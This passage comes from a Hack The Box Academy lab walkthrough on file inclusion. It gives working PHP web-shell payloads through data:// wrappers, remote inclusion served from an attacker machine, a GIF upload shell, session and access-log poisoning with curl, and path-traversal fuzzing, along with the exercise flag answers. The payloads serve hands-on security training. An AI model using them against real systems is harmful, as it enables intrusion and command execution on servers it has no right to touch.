</span><span id="__span-385-3"><a id="__codelineno-385-3" name="__codelineno-385-3"></a>http://94.237.54.42:31967/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&amp;cmd=cat+/37809e2f8952f06139011994726d9ef1.txt
</span></code></pre></div></td></tr></table></div>
<p>Results: <code>HTB{d!$46l3_r3m0t3_url_!nclud3}</code></p>
<p><strong>Attack the target, gain command execution by exploiting the RFI vulnerability, and then look for the flag under one of the directories in /</strong></p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-386-1"> 1</a></span>
<span class="normal"><a href="#__codelineno-386-2"> 2</a></span>
<span class="normal"><a href="#__codelineno-386-3"> 3</a></span>
<span class="normal"><a href="#__codelineno-386-4"> 4</a></span>
<span class="normal"><a href="#__codelineno-386-5"> 5</a></span>
<span class="normal"><a href="#__codelineno-386-6"> 6</a></span>
<span class="normal"><a href="#__codelineno-386-7"> 7</a></span>
<span class="normal"><a href="#__codelineno-386-8"> 8</a></span>
<span class="normal"><a href="#__codelineno-386-9"> 9</a></span>
<span class="normal"><a href="#__codelineno-386-10">10</a></span>
<span class="normal"><a href="#__codelineno-386-11">11</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-386-1"><a id="__codelineno-386-1" name="__codelineno-386-1"></a># In kali attacking machine:
</span><span id="__span-386-2"><a id="__codelineno-386-2" name="__codelineno-386-2"></a>echo &#39;&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;&#39; &gt; shell.php
</span><span id="__span-386-3"><a id="__codelineno-386-3" name="__codelineno-386-3"></a>
</span><span id="__span-386-4"><a id="__codelineno-386-4" name="__codelineno-386-4"></a># We will serve this shell from our attacking machine:
</span><span id="__span-386-5"><a id="__codelineno-386-5" name="__codelineno-386-5"></a> sudo python3 -m http.server 444
</span><span id="__span-386-6"><a id="__codelineno-386-6" name="__codelineno-386-6"></a>
</span><span id="__span-386-7"><a id="__codelineno-386-7" name="__codelineno-386-7"></a># Now, from the vulnerable webapp
</span><span id="__span-386-8"><a id="__codelineno-386-8" name="__codelineno-386-8"></a>http://10.129.128.202/index.php?language=http://10.10.15.90:444/shell.php&amp;cmd=id
</span><span id="__span-386-9"><a id="__codelineno-386-9" name="__codelineno-386-9"></a>
</span><span id="__span-386-10"><a id="__codelineno-386-10" name="__codelineno-386-10"></a># After browsing around:
</span><span id="__span-386-11"><a id="__codelineno-386-11" name="__codelineno-386-11"></a>http://10.129.128.202/index.php?language=http://10.10.15.90:444/shell.php&amp;cmd=cat+/exercise/flag.txt
</span></code></pre></div></td></tr></table></div>
<p>Results: 99a8fc05f033f2fc0cf9a6f9826f83f4</p>
<p><strong>Use any of the techniques covered in this section to gain RCE and read the flag at /</strong></p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-387-1">1</a></span>
<span class="normal"><a href="#__codelineno-387-2">2</a></span>
<span class="normal"><a href="#__codelineno-387-3">3</a></span>
<span class="normal"><a href="#__codelineno-387-4">4</a></span>
<span class="normal"><a href="#__codelineno-387-5">5</a></span>
<span class="normal"><a href="#__codelineno-387-6">6</a></span>
<span class="normal"><a href="#__codelineno-387-7">7</a></span>
<span class="normal"><a href="#__codelineno-387-8">8</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-387-1"><a id="__codelineno-387-1" name="__codelineno-387-1"></a># Crafting Malicious Image:
</span><span id="__span-387-2"><a id="__codelineno-387-2" name="__codelineno-387-2"></a> echo &#39;GIF8&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;&#39; &gt; shell.gif
</span><span id="__span-387-3"><a id="__codelineno-387-3" name="__codelineno-387-3"></a>
</span><span id="__span-387-4"><a id="__codelineno-387-4" name="__codelineno-387-4"></a># We identify where this file was uploaded: `/profile_images/shell.gif`
</span><span id="__span-387-5"><a id="__codelineno-387-5" name="__codelineno-387-5"></a>
</span><span id="__span-387-6"><a id="__codelineno-387-6" name="__codelineno-387-6"></a># And now we can trigger the remote code execution from the vulnerable endpoint within the app. After browsing around we can see that the flag is:
</span><span id="__span-387-7"><a id="__codelineno-387-7" name="__codelineno-387-7"></a>http://94.237.59.180:49225/index.php?language=./profile_images/shell.gif&amp;cmd=cat+/2f40d853e2d4768d87da1c81772bae0a.txt
</span><span id="__span-387-8"><a id="__codelineno-387-8" name="__codelineno-387-8"></a># Note. All the output is preceded by the `GIF8`string
</span></code></pre></div></td></tr></table></div>
<p>Results: HTB{upl04d+lf!+3x3cut3=rc3}</p>
<p><strong>Use any of the techniques covered in this section to gain RCE, then submit the output of the following command: pwd</strong></p>
<p><strong>1.</strong> Reading the log. I we have the following PHPSession cookie:</p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-388-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-388-1"><a id="__codelineno-388-1" name="__codelineno-388-1"></a>Cookie: PHPSession=giiat46h4vo3robfrnoet7neqf
</span></code></pre></div></td></tr></table></div>
<p>Then, its location on disk would be:</p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-389-1">1</a></span>
<span class="normal"><a href="#__codelineno-389-2">2</a></span>
<span class="normal"><a href="#__codelineno-389-3">3</a></span>
<span class="normal"><a href="#__codelineno-389-4">4</a></span>
<span class="normal"><a href="#__codelineno-389-5">5</a></span>
<span class="normal"><a href="#__codelineno-389-6">6</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-389-1"><a id="__codelineno-389-1" name="__codelineno-389-1"></a># Linux
</span><span id="__span-389-2"><a id="__codelineno-389-2" name="__codelineno-389-2"></a>/var/lib/php/sessions/sess_giiat46h4vo3robfrnoet7neqf
</span><span id="__span-389-3"><a id="__codelineno-389-3" name="__codelineno-389-3"></a>
</span><span id="__span-389-4"><a id="__codelineno-389-4" name="__codelineno-389-4"></a># Windows
</span><span id="__span-389-5"><a id="__codelineno-389-5" name="__codelineno-389-5"></a>C:\Windows\Temp\sessions\sess_giiat46h4vo3robfrnoet7neqf
</span><span id="__span-389-6"><a id="__codelineno-389-6" name="__codelineno-389-6"></a>C:\Windows\Temp\sess_giiat46h4vo3robfrnoet7neqf
</span></code></pre></div></td></tr></table></div>
<p>Now, from the endpoint vulnerable to LFI, we can read the log for our session:</p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-390-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-390-1"><a id="__codelineno-390-1" name="__codelineno-390-1"></a>http://94.237.54.42:37338/index.php?language=/var/lib/php/sessions/sess_giiat46h4vo3robfrnoet7neqf
</span></code></pre></div></td></tr></table></div>
<p>Screenshot:</p>
<p><img alt="Read session" src="../img/log-poisoning_00.png" /></p>
<p>We can write the logs with the language parameter. </p>
<p><strong>2.</strong> Write the logs with the following malicious payload:</p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-391-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-391-1"><a id="__codelineno-391-1" name="__codelineno-391-1"></a>http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E
</span></code></pre></div></td></tr></table></div>
<p>whereas the payload is url encoded:</p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-392-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-392-1"><a id="__codelineno-392-1" name="__codelineno-392-1"></a>&lt;?phpsystem($_GET[&quot;cmd&quot;]);?&gt;
</span></code></pre></div></td></tr></table></div>
<p><strong>3.</strong> Execute the shell:</p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-393-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-393-1"><a id="__codelineno-393-1" name="__codelineno-393-1"></a>http://94.237.54.42:37338/index.php?language=/var/lib/php/sessions/sess_giiat46h4vo3robfrnoet7neqf&amp;cmd=ls
</span></code></pre></div></td></tr></table></div>
<p><img alt="" src="../img/log-poisoning_01.png" /></p>
<p>Executing the shell requires writing the shell into the log every time (step 2).</p>
<p>Results:</p>
<p><strong>Try to use a different technique to gain RCE and read the flag at /</strong></p>
<p><strong>1.</strong> As we have located a LFI vulnerability, we can read the <code>access.log</code> file:</p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-394-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-394-1"><a id="__codelineno-394-1" name="__codelineno-394-1"></a>http://94.237.54.42:37338/index.php?language=/var/log/apache2/access.log
</span></code></pre></div></td></tr></table></div>
<p>The log contains the remote IP address, request page, response code, and the User-Agent header.</p>
<p><strong>2.</strong> The User-Agent header is controlled by us through the HTTP request headers, so we should be able to poison this value. We can do it with Burpsuite or via curl:</p>
<div class="language-shell-session highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-395-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-395-1"><a id="__codelineno-395-1" name="__codelineno-395-1"></a><span class="go">curl -s &quot;http://94.237.54.42:37338/index.php&quot; -A &quot;&lt;?php system($_GET[&#39;cmd&#39;]); ?&gt;&quot;</span>
</span></code></pre></div></td></tr></table></div>
<p><strong>3</strong>. Executing the payload:</p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-396-1">1</a></span>
<span class="normal"><a href="#__codelineno-396-2">2</a></span>
<span class="normal"><a href="#__codelineno-396-3">3</a></span>
<span class="normal"><a href="#__codelineno-396-4">4</a></span>
<span class="normal"><a href="#__codelineno-396-5">5</a></span>
<span class="normal"><a href="#__codelineno-396-6">6</a></span>
<span class="normal"><a href="#__codelineno-396-7">7</a></span>
<span class="normal"><a href="#__codelineno-396-8">8</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-396-1"><a id="__codelineno-396-1" name="__codelineno-396-1"></a>GET /index.php?language=/var/log/apache2/access.log&amp;cmd=ls+/ HTTP/1.1
</span><span id="__span-396-2"><a id="__codelineno-396-2" name="__codelineno-396-2"></a>Host: 94.237.54.42:37338
</span><span id="__span-396-3"><a id="__codelineno-396-3" name="__codelineno-396-3"></a>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
</span><span id="__span-396-4"><a id="__codelineno-396-4" name="__codelineno-396-4"></a>Accept-Language: en-US,en;q=0.5
</span><span id="__span-396-5"><a id="__codelineno-396-5" name="__codelineno-396-5"></a>Accept-Encoding: gzip, deflate, br
</span><span id="__span-396-6"><a id="__codelineno-396-6" name="__codelineno-396-6"></a>Connection: keep-alive
</span><span id="__span-396-7"><a id="__codelineno-396-7" name="__codelineno-396-7"></a>Cookie: uid=96; PHPSESSID=giiat46h4vo3robfrnoet7neqf
</span><span id="__span-396-8"><a id="__codelineno-396-8" name="__codelineno-396-8"></a>Upgrade-Insecure-Requests: 1
</span></code></pre></div></td></tr></table></div>
<div class="language-html highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-397-1">1</a></span>
<span class="normal"><a href="#__codelineno-397-2">2</a></span>
<span class="normal"><a href="#__codelineno-397-3">3</a></span>
<span class="normal"><a href="#__codelineno-397-4">4</a></span>
<span class="normal"><a href="#__codelineno-397-5">5</a></span>
<span class="normal"><a href="#__codelineno-397-6">6</a></span>
<span class="normal"><a href="#__codelineno-397-7">7</a></span>
<span class="normal"><a href="#__codelineno-397-8">8</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-397-1"><a id="__codelineno-397-1" name="__codelineno-397-1"></a>GET /index.php?language=/var/log/apache2/access.log<span class="err">&amp;</span>cmd=cat+/c85ee5082f4c723ace6c0796e3a3db09.txt HTTP/1.1
</span><span id="__span-397-2"><a id="__codelineno-397-2" name="__codelineno-397-2"></a>Host: 94.237.54.42:37338
</span><span id="__span-397-3"><a id="__codelineno-397-3" name="__codelineno-397-3"></a>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
</span><span id="__span-397-4"><a id="__codelineno-397-4" name="__codelineno-397-4"></a>Accept-Language: en-US,en;q=0.5
</span><span id="__span-397-5"><a id="__codelineno-397-5" name="__codelineno-397-5"></a>Accept-Encoding: gzip, deflate, br
</span><span id="__span-397-6"><a id="__codelineno-397-6" name="__codelineno-397-6"></a>Connection: keep-alive
</span><span id="__span-397-7"><a id="__codelineno-397-7" name="__codelineno-397-7"></a>Cookie: uid=96; PHPSESSID=giiat46h4vo3robfrnoet7neqf
</span><span id="__span-397-8"><a id="__codelineno-397-8" name="__codelineno-397-8"></a>Upgrade-Insecure-Requests: 1
</span></code></pre></div></td></tr></table></div>
<p>Results: HTB{1095_5#0u1d_n3v3r_63_3xp053d}</p>
<h3 id="automation-and-prevention">Automation and Prevention</h3>
<p><strong>Fuzz the web application for exposed parameters, then try to exploit it with one of the LFI wordlists to read /flag.txt</strong></p>
<p><strong>1.</strong> We will first locate a vulnerable parameter fuzzing with ffuf:</p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-398-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-398-1"><a id="__codelineno-398-1" name="__codelineno-398-1"></a>ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u &#39;http://94.237.59.180:38511/index.php?FUZZ=value&#39; -fs 2309 
</span></code></pre></div></td></tr></table></div>
<p>Output: </p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-399-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-399-1"><a id="__codelineno-399-1" name="__codelineno-399-1"></a>view                    [Status: 200, Size: 1935, Words: 515, Lines: 56, Duration: 50ms]
</span></code></pre></div></td></tr></table></div>
<p><strong>2.</strong> Now we will determine the webroot server:</p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-400-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-400-1"><a id="__codelineno-400-1" name="__codelineno-400-1"></a>ffuf -w /usr/share/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u &#39;http://94.237.59.180:38511/index.php?view=../../../../FUZZ/index.php&#39; -fs 2309
</span></code></pre></div></td></tr></table></div>
<p>Output:</p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-401-1"> 1</a></span>
<span class="normal"><a href="#__codelineno-401-2"> 2</a></span>
<span class="normal"><a href="#__codelineno-401-3"> 3</a></span>
<span class="normal"><a href="#__codelineno-401-4"> 4</a></span>
<span class="normal"><a href="#__codelineno-401-5"> 5</a></span>
<span class="normal"><a href="#__codelineno-401-6"> 6</a></span>
<span class="normal"><a href="#__codelineno-401-7"> 7</a></span>
<span class="normal"><a href="#__codelineno-401-8"> 8</a></span>
<span class="normal"><a href="#__codelineno-401-9"> 9</a></span>
<span class="normal"><a href="#__codelineno-401-10">10</a></span>
<span class="normal"><a href="#__codelineno-401-11">11</a></span>
<span class="normal"><a href="#__codelineno-401-12">12</a></span>
<span class="normal"><a href="#__codelineno-401-13">13</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-401-1"><a id="__codelineno-401-1" name="__codelineno-401-1"></a>srv/www/html/           [Status: 200, Size: 1935, Words: 515, Lines: 56, Duration: 37ms]
</span><span id="__span-401-2"><a id="__codelineno-401-2" name="__codelineno-401-2"></a>home/httpd/             [Status: 200, Size: 1935, Words: 515, Lines: 56, Duration: 37ms]
</span><span id="__span-401-3"><a id="__codelineno-401-3" name="__codelineno-401-3"></a>home/$USER/public_html/ [Status: 200, Size: 1935, Words: 515, Lines: 56, Duration: 37ms]
</span><span id="__span-401-4"><a id="__codelineno-401-4" name="__codelineno-401-4"></a>home/$USER/www/         [Status: 200, Size: 1935, Words: 515, Lines: 56, Duration: 37ms]
</span><span id="__span-401-5"><a id="__codelineno-401-5" name="__codelineno-401-5"></a>var/www/public/         [Status: 200, Size: 1935, Words: 515, Lines: 56, Duration: 37ms]
</span><span id="__span-401-6"><a id="__codelineno-401-6" name="__codelineno-401-6"></a>home/www/               [Status: 200, Size: 1935, Words: 515, Lines: 56, Duration: 37ms]
</span><span id="__span-401-7"><a id="__codelineno-401-7" name="__codelineno-401-7"></a>var/www/sites/          [Status: 200, Size: 1935, Words: 515, Lines: 56, Duration: 38ms]
</span><span id="__span-401-8"><a id="__codelineno-401-8" name="__codelineno-401-8"></a>var/www/                [Status: 200, Size: 1935, Words: 515, Lines: 56, Duration: 37ms]
</span><span id="__span-401-9"><a id="__codelineno-401-9" name="__codelineno-401-9"></a>var/www/public_html/    [Status: 200, Size: 1935, Words: 515, Lines: 56, Duration: 37ms]
</span><span id="__span-401-10"><a id="__codelineno-401-10" name="__codelineno-401-10"></a>var/www/html/default/   [Status: 200, Size: 1935, Words: 515, Lines: 56, Duration: 38ms]
</span><span id="__span-401-11"><a id="__codelineno-401-11" name="__codelineno-401-11"></a>srv/www/                [Status: 200, Size: 1935, Words: 515, Lines: 56, Duration: 345ms]
</span><span id="__span-401-12"><a id="__codelineno-401-12" name="__codelineno-401-12"></a>var/www/html/           [Status: 200, Size: 1935, Words: 515, Lines: 56, Duration: 1369ms]
</span><span id="__span-401-13"><a id="__codelineno-401-13" name="__codelineno-401-13"></a>srv/www/sites/          [Status: 200, Size: 1935, Words: 515, Lines: 56, Duration: 1369ms]
</span></code></pre></div></td></tr></table></div>
<p>Enumerate potential files</p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-402-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-402-1"><a id="__codelineno-402-1" name="__codelineno-402-1"></a>ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u &#39;http://94.237.59.180:38511/index.php?view=../../../../FUZZ&#39; -fs 1935
</span></code></pre></div></td></tr></table></div>
<p>Output:</p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-403-1"> 1</a></span>
<span class="normal"><a href="#__codelineno-403-2"> 2</a></span>
<span class="normal"><a href="#__codelineno-403-3"> 3</a></span>
<span class="normal"><a href="#__codelineno-403-4"> 4</a></span>
<span class="normal"><a href="#__codelineno-403-5"> 5</a></span>
<span class="normal"><a href="#__codelineno-403-6"> 6</a></span>
<span class="normal"><a href="#__codelineno-403-7"> 7</a></span>
<span class="normal"><a href="#__codelineno-403-8"> 8</a></span>
<span class="normal"><a href="#__codelineno-403-9"> 9</a></span>
<span class="normal"><a href="#__codelineno-403-10">10</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-403-1"><a id="__codelineno-403-1" name="__codelineno-403-1"></a>../../../../../../../../../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 3309, Words: 526, Lines: 82, Duration: 35ms]
</span><span id="__span-403-2"><a id="__codelineno-403-2" name="__codelineno-403-2"></a>../../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 3309, Words: 526, Lines: 82, Duration: 36ms]
</span><span id="__span-403-3"><a id="__codelineno-403-3" name="__codelineno-403-3"></a>../../../../../../../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 3309, Words: 526, Lines: 82, Duration: 35ms]
</span><span id="__span-403-4"><a id="__codelineno-403-4" name="__codelineno-403-4"></a>../../../../../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 3309, Words: 526, Lines: 82, Duration: 40ms]
</span><span id="__span-403-5"><a id="__codelineno-403-5" name="__codelineno-403-5"></a>../../../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 3309, Words: 526, Lines: 82, Duration: 40ms]
</span><span id="__span-403-6"><a id="__codelineno-403-6" name="__codelineno-403-6"></a>../../../../../../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 3309, Words: 526, Lines: 82, Duration: 41ms]
</span><span id="__span-403-7"><a id="__codelineno-403-7" name="__codelineno-403-7"></a>../../../../../../../../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 3309, Words: 526, Lines: 82, Duration: 35ms]
</span><span id="__span-403-8"><a id="__codelineno-403-8" name="__codelineno-403-8"></a>../../../../../../../../../../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 3309, Words: 526, Lines: 82, Duration: 35ms]
</span><span id="__span-403-9"><a id="__codelineno-403-9" name="__codelineno-403-9"></a>../../../../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 3309, Words: 526, Lines: 82, Duration: 40ms]
</span><span id="__span-403-10"><a id="__codelineno-403-10" name="__codelineno-403-10"></a>../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 3309, Words: 526, Lines: 82, Duration: 40ms]
</span></code></pre></div></td></tr></table></div>
<p>Print the flag.txt</p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-404-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-404-1"><a id="__codelineno-404-1" name="__codelineno-404-1"></a>http://94.237.59.180:38511/index.php?view=../../../../../../../../../../../../../../../../../../../../../../../../../flag.txt
</span></code></pre></div></td></tr></table></div>
<p>Results: HTB{4u70m47!0n_f!nd5_#!dd3n_93m5}</p>
<p><strong>What is the full path to the php.ini file for Apache?</strong></p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-405-1">1</a></span>
<span class="normal"><a href="#__codelineno-405-2">2</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-405-1"><a id="__codelineno-405-1" name="__codelineno-405-1"></a>ssh htb-student@$ip
</span><span id="__span-405-2"><a id="__codelineno-405-2" name="__codelineno-405-2"></a>find / -name *php.ini 2&gt;/dev/null
</span></code></pre></div></td></tr></table></div>
<p>Results: /etc/php/7.4/apache2/php.ini</p>
<p><strong>Edit the php.ini file to block system(), then try to execute PHP Code that uses system. Read the /var/log/apache2/error.log file and fill in the blank: system() has been disabled for ______ reasons.</strong></p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-406-1">1</a></span>
<span class="normal"><a href="#__codelineno-406-2">2</a></span>
<span class="normal"><a href="#__codelineno-406-3">3</a></span>
<span class="normal"><a href="#__codelineno-406-4">4</a></span>
<span class="normal"><a href="#__codelineno-406-5">5</a></span>
<span class="normal"><a href="#__codelineno-406-6">6</a></span>
<span class="normal"><a href="#__codelineno-406-7">7</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-406-1"><a id="__codelineno-406-1" name="__codelineno-406-1"></a>ssh htb-student@$ip
</span><span id="__span-406-2"><a id="__codelineno-406-2" name="__codelineno-406-2"></a>sudo su
</span><span id="__span-406-3"><a id="__codelineno-406-3" name="__codelineno-406-3"></a>nano /etc/php/7.4/apache2/php.ini
</span><span id="__span-406-4"><a id="__codelineno-406-4" name="__codelineno-406-4"></a>
</span><span id="__span-406-5"><a id="__codelineno-406-5" name="__codelineno-406-5"></a># Locate the disable_functions Directive: Search for the line that starts with disable_functions (if it exists). 
</span><span id="__span-406-6"><a id="__codelineno-406-6" name="__codelineno-406-6"></a># Edit the disable_functions Directive
</span><span id="__span-406-7"><a id="__codelineno-406-7" name="__codelineno-406-7"></a>disable_functions = system
</span></code></pre></div></td></tr></table></div>
<p>Results: security</p>
<h3 id="skills-assessment_6">Skills Assessment</h3>
<p><strong>Assess the web application and use a variety of techniques to gain remote code execution and find a flag in the / root directory of the file system. Submit the contents of the flag as your answer.</strong></p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-407-1">1</a></span>
<span class="normal"><a href="#__codelineno-407-2">2</a></span>
<span class="normal"><a href="#__codelineno-407-3">3</a></span>
<span class="normal"><a href="#__codelineno-407-4">4</a></span>
<span class="normal"><a href="#__codelineno-407-5">5</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-407-1"><a id="__codelineno-407-1" name="__codelineno-407-1"></a># After fuzzing a little, we find the following exploitable parameter. 
</span><span id="__span-407-2"><a id="__codelineno-407-2" name="__codelineno-407-2"></a>http://83.136.250.116:48690/index.php?page=about
</span><span id="__span-407-3"><a id="__codelineno-407-3" name="__codelineno-407-3"></a>
</span><span id="__span-407-4"><a id="__codelineno-407-4" name="__codelineno-407-4"></a># The payload allows us to read php files with a php wrapper base64 encoded:
</span><span id="__span-407-5"><a id="__codelineno-407-5" name="__codelineno-407-5"></a>http://83.136.250.116:48690/index.php?page=php://filter/read=convert.base64-encode/resource=index
</span></code></pre></div></td></tr></table></div>
<p>See the screenshot below:</p>
<p><img alt="" src="../img/file-inclusion.png" /></p>
<p>After decoding it we can read the source code for the index.php page and notice a commented line with the following path within the application:</p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-408-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-408-1"><a id="__codelineno-408-1" name="__codelineno-408-1"></a>/ilf_admin/index.php
</span></code></pre></div></td></tr></table></div>
<p>This opens an entire new world: </p>
<p><img alt="" src="../img/file-inclusion_01.png" /></p>
<p>whereas we can basically read any file of the application by tampering the parameter <code>log</code>:</p>
<p><img alt="" src="../img/file-inclusion_02.png" /></p>
<p>This way, we get access to the <code>/var/log/nginx/access.log</code> file and realize that we can write into it by using the <code>User-agent</code> header request. For example, this request:</p>
<p><img alt="" src="../img/file-inclusion_03.png" /></p>
<p>... then can be executed:</p>
<div class="language-HTML highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-409-1">1</a></span>
<span class="normal"><a href="#__codelineno-409-2">2</a></span>
<span class="normal"><a href="#__codelineno-409-3">3</a></span>
<span class="normal"><a href="#__codelineno-409-4">4</a></span>
<span class="normal"><a href="#__codelineno-409-5">5</a></span>
<span class="normal"><a href="#__codelineno-409-6">6</a></span>
<span class="normal"><a href="#__codelineno-409-7">7</a></span>
<span class="normal"><a href="#__codelineno-409-8">8</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-409-1"><a id="__codelineno-409-1" name="__codelineno-409-1"></a>GET /ilf_admin/index.php?log=../../../../../../var/log/nginx/access.logfile<span class="err">&amp;</span>cmd=ls+/ HTTP/1.1
</span><span id="__span-409-2"><a id="__codelineno-409-2" name="__codelineno-409-2"></a>Host: 83.136.250.116:48690
</span><span id="__span-409-3"><a id="__codelineno-409-3" name="__codelineno-409-3"></a>User-Agent: <span class="cp">&lt;?php system($_GET[&#39;cmd&#39;]); ?&gt;</span>
</span><span id="__span-409-4"><a id="__codelineno-409-4" name="__codelineno-409-4"></a>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
</span><span id="__span-409-5"><a id="__codelineno-409-5" name="__codelineno-409-5"></a>Accept-Language: en-US,en;q=0.5
</span><span id="__span-409-6"><a id="__codelineno-409-6" name="__codelineno-409-6"></a>Accept-Encoding: gzip, deflate, br
</span><span id="__span-409-7"><a id="__codelineno-409-7" name="__codelineno-409-7"></a>Connection: keep-alive
</span><span id="__span-409-8"><a id="__codelineno-409-8" name="__codelineno-409-8"></a>Upgrade-Insecure-Requests: 1
</span></code></pre></div></td></tr></table></div>
<p><img alt="" src="../img/file-inclusion_04.png" /></p>
<p>Printing the flag.txt file:</p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-410-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-410-1"><a id="__codelineno-410-1" name="__codelineno-410-1"></a>http://83.136.250.116:48690/ilf_admin/index.php?log=../../../../../../var/log/nginx/access.log?cmd=cat+flag_dacc60f2348d.txt
</span></code></pre></div></td></tr></table></div>
<p>Results: a9a892dbc9faf9a014f58e007721835e</p>
<h2 id="file-upload-attacks"><a href="https://academy.hackthebox.com/module/details/136">File Upload Attacks</a></h2>
<h2 id="command-injections"><a href="https://academy.hackthebox.com/module/details/109">Command Injections</a></h2>
<h3 id="exploitation_1">Exploitation</h3>
<p><strong>Try adding any of the injection operators after the ip in IP field. What did the error message say (in English)?</strong></p>
<p>Inject directly on the website and there is some frontend side sanitization.</p>
<p>Results: Please match the requested format.</p>
<p>Review the HTML source code of the page to find where the front-end input validation is happening. On which line number is it?</p>
<p><img alt="" src="../img/command-injection_00.png" /></p>
<p>Results: 17</p>
